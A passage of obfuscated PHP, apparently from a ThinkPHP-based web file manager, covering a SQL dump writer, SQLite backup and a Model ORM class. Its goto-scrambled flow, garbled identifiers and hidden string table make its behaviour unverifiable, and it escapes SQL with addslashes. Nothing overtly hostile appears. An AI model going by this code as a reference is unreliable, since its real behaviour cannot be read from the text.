!empty($B©îŒ‘œ à[$_SERVER[°Óó£ÌİóèÅ][364]]) ? $B©îŒ‘œ à[$_SERVER[°Óó£ÌİóèÅ][364]] : array(); $bä¯ÃÍñƒÒ = array(); foreach ($aåîÂ’àîµ as $D¢¢™»´É) { if ($c–öù³Ù‚á == $_SERVER[°Óó£ÌİóèÅ][487] && (!isset($DªåÙœ©‰[$_SERVER[°Óó£ÌİóèÅ][457]]) || $DªåÙœ©‰[$_SERVER[°Óó£ÌİóèÅ][457]] == $_SERVER[°Óó£ÌİóèÅ][410])) { $D¢¢™»´É[$_SERVER[°Óó£ÌİóèÅ][84]] = "\x7b\x69\157\x3a{$f¿ä‰‰©}\x7d" . substr($D¢¢™»´É[$_SERVER[°Óó£ÌİóèÅ][84]], strlen("\x7b\151\x6f\x3a{$D¢¢™»´É[$_SERVER[°Óó£ÌİóèÅ][488]]}\175")); $D¢¢™»´É[$_SERVER[°Óó£ÌİóèÅ][488]] = $f¿ä‰‰©; } $bä¯ÃÍñƒÒ[] = $_SERVER[°Óó£ÌİóèÅ][489] . $this->addSqlSlashes($D¢¢™»´É) . $_SERVER[°Óó£ÌİóèÅ][490]; } if ($f§éã”¦Üò = count($aåîÂ’àîµ)) { $C“èÎ—ô—Ñ = "\x49\x4e\123\x45\x52\x54\40\111\116\124\x4f\x20\x60{$c–öù³Ù‚á}\x60\40\50\140" . implode($_SERVER[°Óó£ÌİóèÅ][491], $BÛÙà˜Õè) . $_SERVER[°Óó£ÌİóèÅ][492]; fwrite($D»¿…âô¡, $C“èÎ—ô—Ñ . implode($_SERVER[°Óó£ÌİóèÅ][493], $bä¯ÃÍñƒÒ) . $_SERVER[°Óó£ÌİóèÅ][76] . PHP_EOL); $Aé°çƒÊ«ˆ->update($f§éã”¦Üò); } $B¤ÇÖ›å‹Ú++; $FóËÙÓİí´ += $f§éã”¦Üò; } while ($f§éã”¦Üò == $CÂ„¤ò¢ç ); fclose($D»¿…âô¡); goto FœÛøŸÎğ²; DİŞ©æ ¬ï: $CÂ„¤ò¢ç  = 2000; $D»¿…âô¡ = fopen($B¹÷š·ããó, $_SERVER[°Óó£ÌİóèÅ][485]); $AùĞ±ĞÔ…Œ = Model($c–öù³Ù‚á)->getPk(); goto Eé˜¨Š§£Ï; eéğå²’÷Î: $f¿ä‰‰© = self::$io; $FóËÙÓİí´ = 0; $B¤ÇÖ›å‹Ú = 1; goto DİŞ©æ ¬ï; FœÛøŸÎğ²: return $FóËÙÓİí´; goto dñóÉË¶ì¢; dñóÉË¶ì¢: } private function addSqlSlashes($C‹”ùåİĞ¸) { $E®§¤ëéçô =& $_SERVER[°Óó£ÌİóèÅ]; $B˜­®Ÿ÷ĞĞ = array(); foreach ($C‹”ùåİĞ¸ as $dÀš¶‰˜İ) { if (is_array($dÀš¶‰˜İ)) { $dÀš¶‰˜İ = json_encode_force($dÀš¶‰˜İ); } $dÀš¶‰˜İ = addslashes($dÀš¶‰˜İ); $dÀš¶‰˜İ = str_replace(array($E®§¤ëéçô[494], $E®§¤ëéçô[61]), array($E®§¤ëéçô[495], $E®§¤ëéçô[496]), $dÀš¶‰˜İ); $B˜­®Ÿ÷ĞĞ[] = $dÀš¶‰˜İ; } return $E®§¤ëéçô[55] . implode($E®§¤ëéçô[497], $B˜­®Ÿ÷ĞĞ) . $E®§¤ëéçô[55]; } private function sqliteFile() { $a·¥Èµ‹ÛÊ =& $_SERVER[°Óó£ÌİóèÅ]; $fÌ‡Š£¨± = null; $c¦ùĞ§‹× = $GLOBALS[$a·¥Èµ‹ÛÊ[6]][$a·¥Èµ‹ÛÊ[17]]; if ($c¦ùĞ§‹×[$a·¥Èµ‹ÛÊ[498]] == $a·¥Èµ‹ÛÊ[499]) { $D÷‘áÏÖó­ = explode($a·¥Èµ‹ÛÊ[500], $c¦ùĞ§‹×[$a·¥Èµ‹ÛÊ[501]]); if (substr($D÷‘áÏÖó­[0], 0, 6) == $a·¥Èµ‹ÛÊ[9]) { $fÌ‡Š£¨± = $D÷‘áÏÖó­[1]; } } else { if (substr($c¦ùĞ§‹×[$a·¥Èµ‹ÛÊ[498]], 0, 6) == $a·¥Èµ‹ÛÊ[9]) { $fÌ‡Š£¨± = $c¦ùĞ§‹×[$a·¥Èµ‹ÛÊ[245]]; } } return $fÌ‡Š£¨±; } public function sqliteBackup($FÂ§ß¸’Ì†) { goto eÎ¤¹ŒÒò; a¥š¯Úªö„: $cˆã®è±Š->end(); $BäÜ¨ÊƒŒ = array($B‹ù¢ãÖí¿[472] => 1, $B‹ù¢ãÖí¿[484] => 1, $B‹ù¢ãÖí¿[473] => 1, $B‹ù¢ãÖí¿[509] => $E§Ø‰»ãá¥); Backup::set($BäÜ¨ÊƒŒ); goto aæÂ²…¬; cÊŠÚõÏ»: $BäÜ¨ÊƒŒ = array($B‹ù¢ãÖí¿[480] => $B‹ù¢ãÖí¿[9], $B‹ù¢ãÖí¿[482] => 1, $B‹ù¢ãÖí¿[504] => $E§Ø‰»ãá¥); Backup::set($BäÜ¨ÊƒŒ); $cˆã®è±Š = new TaskFileTransfer($B‹ù¢ãÖí¿[505], $B‹ù¢ãÖí¿[476], 1, LNG($B‹ù¢ãÖí¿[477]) . $B‹ù¢ãÖí¿[506] . LNG($B‹ù¢ãÖí¿[479]) . $B‹ù¢ãÖí¿[507]); goto a¿ÂÈÇÅÁ—; eÎ¤¹ŒÒò: $B‹ù¢ãÖí¿ =& $_SERVER[°Óó£ÌİóèÅ]; $D÷‹¬Ö¡³ï = self::$io; $EŞ¾¶…ÉŠï = CONTROLLER_DIR . $B‹ù¢ãÖí¿[502]; goto Fµ¼ë…»æŒ; Fµ¼ë…»æŒ: $E‡Ã‡áŠ® = "\x7b\x69\157\x3a{$D÷‹¬Ö¡³ï}\x7d\57\x64\x61\164\x61\142\141\x73\x65\x2f\142\141\x63\x6b\165\160\137" . self::$name . $B‹ù¢ãÖí¿[503]; if (!IO::exist($E‡Ã‡áŠ®)) { IO::mkdir($E‡Ã‡áŠ®); } $E§Ø‰»ãá¥ = IO::size($FÂ§ß¸’Ì†); goto cÊŠÚõÏ»; a¿ÂÈÇÅÁ—: $cˆã®è±Š->task[$B‹ù¢ãÖí¿[463]] = $E§Ø‰»ãá¥; IO::copy($EŞ¾¶…ÉŠï . $B‹ù¢ãÖí¿[508], $E‡Ã‡áŠ®); IO::copy($FÂ§ß¸’Ì†, $E‡Ã‡áŠ®); goto a¥š¯Úªö„; aæÂ²…¬: return !1; goto B©Ç”‚Ğ®; B©Ç”‚Ğ®: } } goto AÂ™šäâî¡; F’§…ºèĞ¿: define($_SERVER[°Óó£ÌİóèÅ][242], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\x65", "\157\x72\144\145\x72", "\x61\154\x69\x61\163", "\x68\x61\x76\x69\156\147", "\x67\162\x6f\x75\x70", "\x6c\157\x63\x6b", "\144\x69\163\x74\x69\156\143\164", "\x61\165\164\x6f", "\146\151\154\164\x65\162", "\166\x61\x6c\151\144\x61\x74\145", "\162\145\163\x75\x6c\x74", "\x62\151\156\144", "\164\x6f\x6b\x65\x6e"); public function __construct($FÀ“Ë£ÈñÅ = '', $c‰÷ĞÎÑ¸¶ = '', $C³áÍ¶²§ò = '') { $D˜ôâÍñğÎ =& $_SERVER[°Óó£ÌİóèÅ]; $this->_initialize(); if (!empty($FÀ“Ë£ÈñÅ)) { if (strpos($FÀ“Ë£ÈñÅ, $D˜ôâÍñğÎ[100])) { list($this->dbName, $this->name) = explode($D˜ôâÍñğÎ[100], $FÀ“Ë£ÈñÅ); } else { $this->name = $FÀ“Ë£ÈñÅ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($c‰÷ĞÎÑ¸¶)) { $this->tablePrefix = $D˜ôâÍñğÎ[33]; } elseif ($D˜ôâÍñğÎ[33] != $c‰÷ĞÎÑ¸¶) { $this->tablePrefix = $c‰÷ĞÎÑ¸¶; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($D˜ôâÍñğÎ[243]); } $this->db(0, empty($this->connection) ? $C³áÍ¶²§ò : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $e¢Ú®‡ƒŠ =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($this->fields)) { if (think_config($e¢Ú®‡ƒŠ[244])) { $F¢¯ù‘ï‚£ = $this->dbName ? $this->dbName : think_config($e¢Ú®‡ƒŠ[245]); $B ä’ï§ö = think_var_cache($e¢Ú®‡ƒŠ[246] . strtolower(get_path_this($F¢¯ù‘ï‚£) . $e¢Ú®‡ƒŠ[100] . $this->name)); if ($B ä’ï§ö) { $F¨»åŠ”‘ = think_config($e¢Ú®‡ƒŠ[247]); if (empty($F¨»åŠ”‘) || $B ä’ï§ö[$e¢Ú®‡ƒŠ[248]] == $F¨»åŠ”‘) { $this->fields = $B ä’ï§ö; return; } } } $this->flush(); } } public function flush() { goto b —°¿…„Ó; b —°¿…„Ó: $Aº©İ›ì£“ =& $_SERVER[°Óó£ÌİóèÅ]; $this->db->setModel($this->name); $B·ÈØÚÁé = $this->db->getFields($this->getTableName()); goto BÕ¹ˆÒ–È•; fº”‚˜êš: if (think_config($Aº©İ›ì£“[244])) { $d¼‹öÖï² = $this->dbName ? $this->dbName : think_config($Aº©İ›ì£“[245]); think_var_cache($Aº©İ›ì£“[246] . strtolower(get_path_this($d¼‹öÖï²) . $Aº©İ›ì£“[100] . $this->name), $this->fields); } goto B“Äİ£‰è¤; BÕ¹ˆÒ–È•: if (!$B·ÈØÚÁé) { return !1; } $this->fields = array_keys($B·ÈØÚÁé); $this->fields[$Aº©İ›ì£“[249]] = !1; goto A¤ëŞçìÎõ; A¤ëŞçìÎõ: foreach ($B·ÈØÚÁé as $A‘õÇõóØ => $dÉÑ¢‘ˆˆ†) { $f¾¬‹¾ ×[$A‘õÇõóØ] = $dÉÑ¢‘ˆˆ†[$Aº©İ›ì£“[29]]; if ($dÉÑ¢‘ˆˆ†[$Aº©İ›ì£“[36]]) { $this->fields[$Aº©İ›ì£“[250]] = $A‘õÇõóØ; if ($dÉÑ¢‘ˆˆ†[$Aº©İ›ì£“[39]]) { $this->fields[$Aº©İ›ì£“[249]] = !0; } } } $this->fields[$Aº©İ›ì£“[251]] = $f¾¬‹¾ ×; if (think_config($Aº©İ›ì£“[247])) { $this->fields[$Aº©İ›ì£“[248]] = think_config($Aº©İ›ì£“[247]); } goto fº”‚˜êš; B“Äİ£‰è¤: } public function switchModel($BãĞÎ†…º¼, $fŞçµãŒò = array()) { $a×½ºù×²ˆ =& $_SERVER[°Óó£ÌİóèÅ]; $e”ƒ¨³áğ· = ucwords(strtolower($BãĞÎ†…º¼)) . $a×½ºù×²ˆ[252]; if (!class_exists($e”ƒ¨³áğ·)) { think_exception($e”ƒ¨³áğ· . think_lang($a×½ºù×²ˆ[253])); } $this->_extModel = new $e”ƒ¨³áğ·($this->name); if (!empty($fŞçµãŒò)) { foreach ($fŞçµãŒò as $AĞœœåµÕ) { $this->_extModel->setProperty($AĞœœåµÕ, $this->{$AĞœœåµÕ}); } } return $this->_extModel; } public function __set($c”‰µ³¯Å, $B·ÊÃÜÛ¿Ù) { $this->data[$c”‰µ³¯Å] = $B·ÊÃÜÛ¿Ù; } public function __get($A …¿·ÆãÑ) { return isset($this->data[$A …¿·ÆãÑ]) ? $this->data[$A …¿·ÆãÑ] : null; } public function __isset($eØàçíºø°) { return isset($this->data[$eØàçíºø°]); } public function __unset($B¬‘ÔÎ•‘É) { unset($this->data[$B¬‘ÔÎ•‘É]); } public function __call($bÃ£Ì¯È‚, $D ê¤³) { $BòåŞâ„æ =& $_SERVER[°Óó£ÌİóèÅ]; if (in_array(strtolower($bÃ£Ì¯È‚), $this->methods, !0)) { $this->options[strtolower($bÃ£Ì¯È‚)] = $D ê¤³[0]; return $this; } elseif (in_array(strtolower($bÃ£Ì¯È‚), array($BòåŞâ„æ[254], $BòåŞâ„æ[255], $BòåŞâ„æ[256], $BòåŞâ„æ[257], $BòåŞâ„æ[258]), !0)) { $aÊ«¦Íê—ƒ = isset($D ê¤³[0]) ? $D ê¤³[0] : $BòåŞâ„æ[181]; $aÊ«¦Íê—ƒ = $this->db->parseKey($aÊ«¦Íê—ƒ); return $this->getField(strtoupper($bÃ£Ì¯È‚) . $BòåŞâ„æ[259] . $aÊ«¦Íê—ƒ . $BòåŞâ„æ[260] . $bÃ£Ì¯È‚, $BòåŞâ„æ[254]); } elseif (strtolower(substr($bÃ£Ì¯È‚, 0, 5)) == $BòåŞâ„æ[261]) { $aÊ«¦Íê—ƒ = think_parse_name(substr($bÃ£Ì¯È‚, 5)); $F˜Ö¾°Å‰ç[$aÊ«¦Íê—ƒ] = $D ê¤³[0]; return $this->where($F˜Ö¾°Å‰ç)->find(); } elseif (strtolower(substr($bÃ£Ì¯È‚, 0, 10)) == $BòåŞâ„æ[262]) { $a££°—µñù = think_parse_name(substr($bÃ£Ì¯È‚, 10)); $F˜Ö¾°Å‰ç[$a££°—µñù] = $D ê¤³[0]; return $this->where($F˜Ö¾°Å‰ç)->getField($D ê¤³[1]); } elseif (isset($this->_scope[$bÃ£Ì¯È‚])) { return $this->scope($bÃ£Ì¯È‚, $D ê¤³[0]); } elseif (method_exists($this, $bÃ£Ì¯È‚)) { array_unshift($D ê¤³, $bÃ£Ì¯È‚); return call_user_func_array(array($this, $BòåŞâ„æ[263]), $D ê¤³); } else { return call_user_func_array(array(parent, $bÃ£Ì¯È‚), $D ê¤³); } } protected function call() { goto Aßƒî´—ğÊ; Aßƒî´—ğÊ: $A§ëñ‰¸Ş =& $_SERVER[°Óó£ÌİóèÅ]; $FÎ¤šù¿î = func_get_args(); $c¿ãˆÈ‚â  = array_shift($FÎ¤šù¿î); goto cøÜ‰‘Ê; dª–‚ºö‚‡: $FÎ¤šù¿î[] = $c¿ãˆÈ‚â ; if (method_exists($this, $A§ëñ‰¸Ş[265])) { $CâÆö¤Â¥­ = call_user_func_array(array($this, $A§ëñ‰¸Ş[266]), array($D—ˆÃ§¾Àã, $FÎ¤šù¿î)); if (!is_null($CâÆö¤Â¥­) && $CâÆö¤Â¥­ !== !1) { return $CâÆö¤Â¥­; } } $e¥î™ÍÑÑ = call_user_func_array(array($this, $c¿ãˆÈ‚â ), $FÎ¤šù¿î); goto e¤éÛ’Ò§ß; e¤éÛ’Ò§ß: if (method_exists($this, $A§ëñ‰¸Ş[267])) { $CâÆö¤Â¥­ = call_user_func_array(array($this, $A§ëñ‰¸Ş[268]), array($D—ˆÃ§¾Àã, $FÎ¤šù¿î, $e¥î™ÍÑÑ)); if ($CâÆö¤Â¥­) { return $CâÆö¤Â¥­; } } return $e¥î™ÍÑÑ; goto fÉ¨½®‰½; cøÜ‰‘Ê: $D—ˆÃ§¾Àã = $c¿ãˆÈ‚â ; if (is_array($c¿ãˆÈ‚â )) { $D—ˆÃ§¾Àã = $c¿ãˆÈ‚â [1]; $c¿ãˆÈ‚â  = $c¿ãˆÈ‚â [0]; } if ($FÎ¤šù¿î[count($FÎ¤šù¿î) - 1] === $c¿ãˆÈ‚â ) { think_exception(__CLASS__ . $A§ëñ‰¸Ş[4] . $c¿ãˆÈ‚â  . think_lang($A§ëñ‰¸Ş[264])); return; } goto dª–‚ºö‚‡; fÉ¨½®‰½: } protected function _initialize() { } protected function _facade($b«ğ˜Àö¬Ç) { $f×ß´å§ğ¸ =& $_SERVER[°Óó£ÌİóèÅ]; if (!empty($this->fields)) { foreach ($b«ğ˜Àö¬Ç as $A÷‰£Ï´Ï => $BÚÌÀÑô«ì) { if (!in_array($A÷‰£Ï´Ï, $this->fields, !0)) { unset($b«ğ˜Àö¬Ç[$A÷‰£Ï´Ï]); } elseif (is_scalar($BÚÌÀÑô«ì)) { $this->_parseType($b«ğ˜Àö¬Ç, $A÷‰£Ï´Ï); } } } if (!empty($this->options[$f×ß´å§ğ¸[269]])) { $b«ğ˜Àö¬Ç = array_map($this->options[$f×ß´å§ğ¸[269]], $b«ğ˜Àö¬Ç); unset($this->options[$f×ß´å§ğ¸[269]]); } $this->_beforeWrite($b«ğ˜Àö¬Ç); return $b«ğ˜Àö¬Ç; } protected function _beforeWrite(&$A±Èˆ¯Ó¤¾) { } public function add($A‡ÈÆ¯¶Ôö = '', $ešøŞ‰ø¥ã = array(), $eÎ§©¸ëÖÑ = false) { goto d²¹¬Ïî¤‘; f‡¬ªäÖÛğ: return $e›øÄ¼Â; goto AµÂ»…°·; A›®˜ï¿Õ: if (!1 === $this->_beforeInsert($A‡ÈÆ¯¶Ôö, $ešøŞ‰ø¥ã)) { return !1; } $e›øÄ¼Â = $this->db->insert($A‡ÈÆ¯¶Ôö, $ešøŞ‰ø¥ã, $eÎ§©¸ëÖÑ); if (!1 !== $e›øÄ¼Â) { $FåŠ¦„ÆßÕ = $this->getLastInsID(); if ($FåŠ¦„ÆßÕ) { $A‡ÈÆ¯¶Ôö[$this->getPk()] = $FåŠ¦„ÆßÕ; $this->_after_insert($A‡ÈÆ¯¶Ôö, $ešøŞ‰ø¥ã); return $FåŠ¦„ÆßÕ; } $this->_after_insert($A‡ÈÆ¯¶Ôö, $ešøŞ‰ø¥ã); } goto f‡¬ªäÖÛğ; d²¹¬Ïî¤‘: if (empty($A‡ÈÆ¯¶Ôö)) { if (!empty($this->data)) { $A‡ÈÆ¯¶Ôö = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[°Óó£ÌİóèÅ][270]); return !1; } } $ešøŞ‰ø¥ã = $this->_parseOptions($ešøŞ‰ø¥ã); $A‡ÈÆ¯¶Ôö = $this->_facade($A‡ÈÆ¯¶Ôö); goto A›®˜ï¿Õ; AµÂ»…°·: } protected function _beforeInsert(&$AõÇµŠ‡Î½, $C†äµÜ¢é®) { } protected function _after_insert($CùæìŠƒ¤, $fµ¿ƒ¿ºÇ) { } public function addAll($aõÒ‰ÂíöŸ, $C‹¶ŠÔ­ŒÀ = array(), $A¶‘¥Áº = false) { goto aŞŞ—ªÔù¹; A ”ôè¢Ğ: return $C«õó¬´‚´; goto CèŠÄÃ¿†; aŞŞ—ªÔù¹: $c‘ãêÑÕÛ =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($aõÒ‰ÂíöŸ)) { $this->error = think_lang($c‘ãêÑÕÛ[270]); return !1; } $C‹¶ŠÔ­ŒÀ = $this->_parseOptions($C‹¶ŠÔ­ŒÀ); goto F·À¥À²Ç‚; F·À¥À²Ç‚: foreach ($aõÒ‰ÂíöŸ as $FŞˆåÛîÀ¢ => $bÏ”£¥‰Ô„) { $aõÒ‰ÂíöŸ[$FŞˆåÛîÀ¢] = $this->_facade($bÏ”£¥‰Ô„); } if (method_exists($this->db, $c‘ãêÑÕÛ[271])) { $C«õó¬´‚´ = $this->db->insertAll($aõÒ‰ÂíöŸ, $C‹¶ŠÔ­ŒÀ, $A¶‘¥Áº); } else { $this->startTrans(); foreach ($aõÒ‰ÂíöŸ as $FŞˆåÛîÀ¢ => $bÏ”£¥‰Ô„) { $C«õó¬´‚´ = $this->db->insert($bÏ”£¥‰Ô„, $C‹¶ŠÔ­ŒÀ, $A¶‘¥Áº); } $this->commit(); } if (!1 !== $C«õó¬´‚´) { $FÊìÜÊ…ó = $this->getLastInsID(); if ($FÊìÜÊ…ó) { return $FÊìÜÊ…ó; } } goto A ”ôè¢Ğ; CèŠÄÃ¿†: } public function selectAdd($f¢ßÔ¾‡ëÈ = '', $C£‹°‹§Õµ = '', $E±Ô–½®Ÿ‡ = array()) { $B¦È°İ” =& $_SERVER[°Óó£ÌİóèÅ]; $E±Ô–½®Ÿ‡ = $this->_parseOptions($E±Ô–½®Ÿ‡); if (!1 === ($eŒŠ‰†öŞ“ = $this->db->selectInsert($f¢ßÔ¾‡ëÈ ? $f¢ßÔ¾‡ëÈ : $E±Ô–½®Ÿ‡[$B¦È°İ”[272]], $C£‹°‹§Õµ ? $C£‹°‹§Õµ : $this->getTableName(), $E±Ô–½®Ÿ‡))) { $this->error = think_lang($B¦È°İ”[273]); return !1; } else { return $eŒŠ‰†öŞ“; } } public function save($aÑ¼‘¸å¤ = '', $Dê™ŠÚ«†£ = array()) { goto a–±·¯°¬; DÏÆÅ¼¬ã‡: if (is_array($Dê™ŠÚ«†£[$AÑÜ³¬ã•[274]]) && isset($Dê™ŠÚ«†£[$AÑÜ³¬ã•[274]][$bÏùÁÆ¥•Œ])) { $BÑ‡˜‚ˆí– = $Dê™ŠÚ«†£[$AÑÜ³¬ã•[274]][$bÏùÁÆ¥•Œ]; } if (!1 === $this->_beforeUpdate($aÑ¼‘¸å¤, $Dê™ŠÚ«†£)) { return !1; } $EàÁáë„Ââ = $this->db->update($aÑ¼‘¸å¤, $Dê™ŠÚ«†£); goto cÕ­ÊíÜ™; cÕ­ÊíÜ™: if (!1 !== $EàÁáë„Ââ) { if (isset($BÑ‡˜‚ˆí–)) { $aÑ¼‘¸å¤[$bÏùÁÆ¥•Œ] = $BÑ‡˜‚ˆí–; } $this->_afterUpdate($aÑ¼‘¸å¤, $Dê™ŠÚ«†£); } return $EàÁáë„Ââ; goto D¯Æ¼ØÏÕ; a–±·¯°¬: $AÑÜ³¬ã• =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($aÑ¼‘¸å¤)) { if (!empty($this->data)) { $aÑ¼‘¸å¤ = $this->data; $this->data = array(); } else { $this->error = think_lang($AÑÜ³¬ã•[270]); return !1; } } $aÑ¼‘¸å¤ = $this->_facade($aÑ¼‘¸å¤); goto BÆ¿–¼…˜; BÆ¿–¼…˜: $Dê™ŠÚ«†£ = $this->_parseOptions($Dê™ŠÚ«†£); $bÏùÁÆ¥•Œ = $this->getPk(); if (!isset($Dê™ŠÚ«†£[$AÑÜ³¬ã•[274]])) { if (isset($aÑ¼‘¸å¤[$bÏùÁÆ¥•Œ])) { $CÌÙÙÅˆ©¸[$bÏùÁÆ¥•Œ] = $aÑ¼‘¸å¤[$bÏùÁÆ¥•Œ]; $Dê™ŠÚ«†£[$AÑÜ³¬ã•[274]] = $CÌÙÙÅˆ©¸; unset($aÑ¼‘¸å¤[$bÏùÁÆ¥•Œ]); } else { $this->error = think_lang($AÑÜ³¬ã•[273]); return !1; } } goto DÏÆÅ¼¬ã‡; D¯Æ¼ØÏÕ: } protected function _beforeUpdate(&$EØ™Ø‰ä…Ï, $d»•É«ğ…¶) { } protected function _afterUpdate($bàÆŸìÛÃ³, $BöÀğŒŞÄ) { } public function delete($eŒ‰ÂÑï°Ï = array()) { goto d ¢ğÉÄİÚ; d ¢ğÉÄİÚ: $c•Ší×éÂ =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($eŒ‰ÂÑï°Ï) && empty($this->options[$c•Ší×éÂ[274]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $c»ÁãÑÆòÒ = $this->getPk(); goto c°ÏøÆ¼«ƒ; A£‹ìÍˆé¸: $d¤ç­íÈ¬‹ = $this->db->delete($eŒ‰ÂÑï°Ï); if (!1 !== $d¤ç­íÈ¬‹) { $F·¤—³ªéª = array(); if (isset($DÀ÷åù¡‰³)) { $F·¤—³ªéª[$c»ÁãÑÆòÒ] = $DÀ÷åù¡‰³; } $this->_after_delete($F·¤—³ªéª, $eŒ‰ÂÑï°Ï); } return $d¤ç­íÈ¬‹; goto Cˆ¤ğê†˜£; c°ÏøÆ¼«ƒ: if (is_numeric($eŒ‰ÂÑï°Ï) || is_string($eŒ‰ÂÑï°Ï)) { if (strpos($eŒ‰ÂÑï°Ï, $c•Ší×éÂ[47])) { $b¬¢°Ùª˜İ[$c»ÁãÑÆòÒ] = array($c•Ší×éÂ[275], $eŒ‰ÂÑï°Ï); } else { $b¬¢°Ùª˜İ[$c»ÁãÑÆòÒ] = $eŒ‰ÂÑï°Ï; } $this->options[$c•Ší×éÂ[274]] = $b¬¢°Ùª˜İ; } $eŒ‰ÂÑï°Ï = $this->_parseOptions(); if (is_array($eŒ‰ÂÑï°Ï[$c•Ší×éÂ[274]]) && isset($eŒ‰ÂÑï°Ï[$c•Ší×éÂ[274]][$c»ÁãÑÆòÒ])) { $DÀ÷åù¡‰³ = $eŒ‰ÂÑï°Ï[$c•Ší×éÂ[274]][$c»ÁãÑÆòÒ]; } goto A£‹ìÍˆé¸; Cˆ¤ğê†˜£: } protected function _after_delete($E¹·Í”¹¥, $eÍ¡ƒ»‚ô») { } public function select($B¥ËÉ™´ï¶ = array()) { goto eĞâË¨ñ²¿; fÜÂƒÄ¥ÀŠ: $this->_afterSelect($dĞÕ©›êäÕ, $B¥ËÉ™´ï¶); return $dĞÕ©›êäÕ; goto CºÛà®åª; eĞâË¨ñ²¿: $d¹¨Ş¿î„‡ =& $_SERVER[°Óó£ÌİóèÅ]; if (is_string($B¥ËÉ™´ï¶) || is_numeric($B¥ËÉ™´ï¶)) { $dÆíÏº = $this->getPk(); if (strpos($B¥ËÉ™´ï¶, $d¹¨Ş¿î„‡[47])) { $D­Ö¼“ÙÏƒ[$dÆíÏº] = array($d¹¨Ş¿î„‡[275], $B¥ËÉ™´ï¶); } else { $D­Ö¼“ÙÏƒ[$dÆíÏº] = $B¥ËÉ™´ï¶; } $this->options[$d¹¨Ş¿î„‡[274]] = $D­Ö¼“ÙÏƒ; } elseif (!1 === $B¥ËÉ™´ï¶) { $B¥ËÉ™´ï¶ = $this->_parseOptions(); return $d¹¨Ş¿î„‡[276] . $this->db->buildSelectSql($B¥ËÉ™´ï¶) . $d¹¨Ş¿î„‡[277]; } $B¥ËÉ™´ï¶ = $this->_parseOptions(); goto E’ƒˆñ‘À; E’ƒˆñ‘À: $dĞÕ©›êäÕ = $this->db->select($B¥ËÉ™´ï¶); if (!1 === $dĞÕ©›êäÕ) { return !1; } if (empty($dĞÕ©›êäÕ)) { return null; } goto fÜÂƒÄ¥ÀŠ; CºÛà®åª: } protected function _afterSelect(&$c——ç¦ğµ, $fŞÑìÅÑ”í) { } public function buildSql($F–êÍÅÌ‰Õ = array()) { $bÌ¨”¯Ş÷ =& $_SERVER[°Óó£ÌİóèÅ]; $F–êÍÅÌ‰Õ = $this->_parseOptions($F–êÍÅÌ‰Õ); return $bÌ¨”¯Ş÷[276] . $this->db->buildSelectSql($F–êÍÅÌ‰Õ) . $bÌ¨”¯Ş÷[277]; } public function optionsValue($DÜªïÇé‚° = null) { if (is_null($DÜªïÇé‚°)) { return $this->options; } elseif (is_array($DÜªïÇé‚°)) { $this->options = array_merge($this->options, $DÜªïÇé‚°); } } protected function _parseOptions($F–éÈÏŒŞ‡ = array()) { goto bÑÕèî±™‹; f´ÃêÑ•ôã: if (!isset($F–éÈÏŒŞ‡[$e÷ììâÑÌ—[278]])) { $F–éÈÏŒŞ‡[$e÷ììâÑÌ—[278]] = $this->getTableName(); $cáÁšˆÔ‘é = $this->fields; } else { $cáÁšˆÔ‘é = $this->getDbFields(); } if (!empty($F–éÈÏŒŞ‡[$e÷ììâÑÌ—[279]])) { $F–éÈÏŒŞ‡[$e÷ììâÑÌ—[278]] .= $e÷ììâÑÌ—[50] . $F–éÈÏŒŞ‡[$e÷ììâÑÌ—[279]]; } $F–éÈÏŒŞ‡[$e÷ììâÑÌ—[280]] = $this->name; goto B –Âº¡; B –Âº¡: if (isset($F–éÈÏŒŞ‡[$e÷ììâÑÌ—[274]]) && is_array($F–éÈÏŒŞ‡[$e÷ììâÑÌ—[274]]) && !empty($cáÁšˆÔ‘é) && !isset($F–éÈÏŒŞ‡[$e÷ììâÑÌ—[281]]) && !isset($F–éÈÏŒŞ‡[$e÷ììâÑÌ—[278]])) { foreach ($F–éÈÏŒŞ‡[$e÷ììâÑÌ—[274]] as $b‹Êã‡‡¢‰ => $Aï÷†ƒö¤) { $b‹Êã‡‡¢‰ = trim($b‹Êã‡‡¢‰); if (in_array($b‹Êã‡‡¢‰, $cáÁšˆÔ‘é, !0)) { if (is_scalar($Aï÷†ƒö¤)) { $this->_parseType($F–éÈÏŒŞ‡[$e÷ììâÑÌ—[274]], $b‹Êã‡‡¢‰); } } elseif (!is_numeric($b‹Êã‡‡¢‰) && $e÷ììâÑÌ—[79] != substr($b‹Êã‡‡¢‰, 0, 1) && !1 === strpos($b‹Êã‡‡¢‰, $e÷ììâÑÌ—[100]) && !1 === strpos($b‹Êã‡‡¢‰, $e÷ììâÑÌ—[259]) && !1 === strpos($b‹Êã‡‡¢‰, $e÷ììâÑÌ—[282]) && !1 === strpos($b‹Êã‡‡¢‰, $e÷ììâÑÌ—[283])) { unset($F–éÈÏŒŞ‡[$e÷ììâÑÌ—[274]][$b‹Êã‡‡¢‰]); } } } $this->_options_filter($F–éÈÏŒŞ‡); return $F–éÈÏŒŞ‡; goto FíÌ°§ŠøÊ; bÑÕèî±™‹: $e÷ììâÑÌ— =& $_SERVER[°Óó£ÌİóèÅ]; if (is_array($F–éÈÏŒŞ‡)) { $F–éÈÏŒŞ‡ = array_merge($this->options, $F–éÈÏŒŞ‡); } $this->options = array(); goto f´ÃêÑ•ôã; FíÌ°§ŠøÊ: } protected function _options_filter(&$fõ¶ªõšš) { } protected function _parseType(&$b…óãêËÄ, $CšÕÀ¦Ğ÷‹) { $eêİ®ó× =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($this->options[$eêİ®ó×[284]][$eêİ®ó×[4] . 